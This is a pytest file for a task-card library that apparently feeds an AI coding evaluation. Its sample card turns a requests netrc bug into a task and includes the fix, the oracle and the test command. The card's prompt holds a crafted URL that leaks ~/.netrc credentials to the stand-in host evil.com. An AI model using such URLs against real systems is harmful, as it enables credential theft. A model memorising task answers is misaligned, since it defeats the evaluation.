"""spec-0010/T1: SeedLibrary read/write + card schema round-trip + contract constraint validation."""

from __future__ import annotations

import pytest

from ahe_beta.distill.seed_library import (
    CAPABILITY_TAXONOMY,
    DOMAIN_VOCAB,
    SeedLibrary,
    validate_card,
)


def _card(seed_id: str = "seed-requests-6964") -> dict:
    # seed-card-schema.md card shape; field appearance derived from real harvest examples (psf/requests netrc leak fix).
    return {
        "id": seed_id,
        "source": {
            "type": "closed_issue+fix_pr",
            "repo": "psf/requests",
            "issue_url": "https://github.com/psf/requests/issues/6964",
            "fix_ref": "https://github.com/psf/requests/pull/6965 (merged 2025-06)",
            "not_in_benchmark": True,
        },
        "task": {
            "prompt": (
                "i keep creds in my ~/.netrc for example.com. when i call "
                "requests.get('http://example.com:@evil.com/') my creds leak to evil.com. "
                "can you make it stop?"
            ),
            "context": "requests, a ~/.netrc with credentials, a crafted URL with empty userinfo before an @",
        },
        "domain": "web-backend",
        "capability_probed": ["correctness-edgecase"],
        "difficulty": "medium",
        "scope": "single-file",
        "autonomy_required": "collaborative",
        "oracle": {
            "tier": "executable-test",
            "spec": "regression test in PR #6962 (FAIL@parent -> PASS@fix)",
            "reference_solution": "PR #6965: resolve netrc host from urlparse().hostname",
            "confidence": "high",
        },
        "env": {
            "reproducible": "easy",
            "base_image": "python:3.11",
            "repo_at": "0e322af87745eff34caffe4df68456ebc20d9068",
            "setup": ["pip install -e .", "pip install -r requirements-dev.txt"],
            "test_cmd": "pytest tests/test_utils.py -k netrc",
            "external_deps": "none",
            "budget": {"timeout_s": 300, "mem_gb": 2},
        },
        "pairing_constraints": {"domain": "web-backend", "min_capability": "competent"},
        "gates": {"oracle_gate": "pass", "harbor_repro_gate": "pass"},
        "provenance": {
            "resolution_quote": 'uses the "hostname" attribute from the parsed url to get the host',
            "source": "https://github.com/psf/requests/pull/6962",
        },
    }


def test_empty_library_loads_empty(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    assert lib.load() == []


def test_add_then_load_and_get(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    card = _card()
    lib.add(card)

    loaded = lib.load()
    assert len(loaded) == 1
    assert loaded[0] == card
    assert lib.get("seed-requests-6964") == card


def test_load_tolerates_harvest_envelope(tmp_path) -> None:
    # Envelope produced by harvest: {version, harvested_at, note, seeds:[...]}; load extracts seeds and ignores metadata keys.
    import json

    path = tmp_path / "seeds.json"
    path.write_text(
        json.dumps(
            {"version": 1, "harvested_at": "2026-07-02", "note": "x", "seeds": [_card("seed-a")]},
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )
    lib = SeedLibrary(path)
    loaded = lib.load()
    assert len(loaded) == 1
    assert loaded[0]["id"] == "seed-a"
    assert lib.get("seed-a")["id"] == "seed-a"


def test_get_missing_raises_keyerror(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    lib.add(_card("seed-a"))
    with pytest.raises(KeyError):
        lib.get("does-not-exist")


def test_card_roundtrips_and_tolerates_unknown_keys(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    card = _card()
    # Evolution-friendly: unknown keys should be preserved as-is and the read side should not error (forward compatible).
    card["future_field"] = {"note": "schema Added through evolution"}
    lib.add(card)
    got = lib.get(card["id"])
    # Field-level consistency: includes source/task/env/oracle/gates/provenance and unknown keys
    assert got == card
    # held-out fields sediment with the card (retained on collection side; stripped on injection side, see 0010/T2).
    assert got["oracle"]["tier"] == "executable-test"
    assert got["env"]["test_cmd"] == "pytest tests/test_utils.py -k netrc"
    assert got["gates"]["oracle_gate"] == "pass"


def test_validate_card_rejects_benchmark_field() -> None:
    bad = _card()
    # Field outside the contract (benchmark-derived) → must be rejected
    bad["benchmark_score"] = 0.87
    with pytest.raises(ValueError, match="fields outside the contract"):
        validate_card(bad)


def test_validate_card_rejects_not_in_benchmark_false() -> None:
    bad = _card()
    # benchmark instances → must reject (prevent contamination)
    bad["source"]["not_in_benchmark"] = False
    with pytest.raises(ValueError, match="not_in_benchmark"):
        validate_card(bad)


def test_validate_card_rejects_domain_out_of_vocab() -> None:
    bad = _card()
    bad["domain"] = "quantum-computing"  # Not in the controlled vocabulary
    with pytest.raises(ValueError, match="controlled vocabulary"):
        validate_card(bad)


def test_validate_card_rejects_capability_out_of_taxonomy() -> None:
    bad = _card()
    bad["capability_probed"] = ["correctness-edgecase", "telepathy"]  # telepathy cross-table
    with pytest.raises(ValueError, match="capabilities outside the taxonomy"):
        validate_card(bad)


def test_valid_card_passes_validation() -> None:
    validate_card(_card())  # Passing = no exception raised
    assert _card()["domain"] in DOMAIN_VOCAB
    assert set(_card()["capability_probed"]) <= CAPABILITY_TAXONOMY
